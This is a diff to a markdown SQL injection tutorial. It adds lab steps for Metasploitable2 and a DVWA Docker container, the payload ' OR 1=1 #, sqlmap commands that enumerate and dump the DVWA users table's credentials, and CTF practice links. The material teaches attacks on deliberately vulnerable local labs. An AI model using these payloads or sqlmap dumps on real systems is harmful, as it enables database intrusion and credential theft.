@@ -14,7 +14,7 @@
     - Manual Exploitation via manipulating the URL
     - Writing a Python Script to automate the exploitation process
   - Exploit MetaSpoitable2 VM
-    - Security Level 0 => (No Protection) ==> - Manual Exploitation via entering the Payload in the input fields
+    - Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields
     - Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**
     - Security Level 2 => (Advanced Protection) ==> Show the secure code
   - Using SQL Map to make life easier
@@ -121,7 +121,60 @@ if __name__ == "__main__":
         print("[-] SQL injection unsuccessful!")
 ```
 
-#### 2.1.3 Using SQL Map to exploit the Vulnerability
+### 2.2 Exploit MetaSpoitable2 VM
+
+#### 2.2.1 Security Level 0 => (No Protection) ==> Manual Exploitation via entering the Payload in the input fields
+
+- MySQL Payload
+
+```sql
+' OR 1=1 #
+```
+
+#### 2.2.2 Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**
+
+- MySQL Payload
+
+```sql
+' OR 1=1 #
+```
+
+#### 2.2.3 Security Level 2 => (Advanced Protection) ==> Show the secure code
+
+### 2.3 Using SQL Map to make life easier
+
+#### 2.3.1 Setup Docker Container with Vulnerable Web Application
+
+```bash
+sudo apt install docker.io
+sudo systemctl status docker
+docker run -d -p 80:80 vulnerables/web-dvwa
+docker ps
+```
+
+#### 2.3.2 Exploit the Vulnerability with SQL Map
+
+```bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
+
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables
+
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users --columns
+
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users -C user,password --dump
+```
+
+### 2.4 Solving CTF Challenges
+
+#### 2.4.1 PicoCTF SQL Injection
+
+- [SQL Injection](https://picoctf.org/practice-questions)
+
+#### 2.4.2 HackTheBox || TryHackMe Rooms
+
+- [HTB](https://www.hackthebox.eu/home/machines/profile/129)
+
+- [THM](https://tryhackme.com/room/sqlinjection)
 
 ---
 
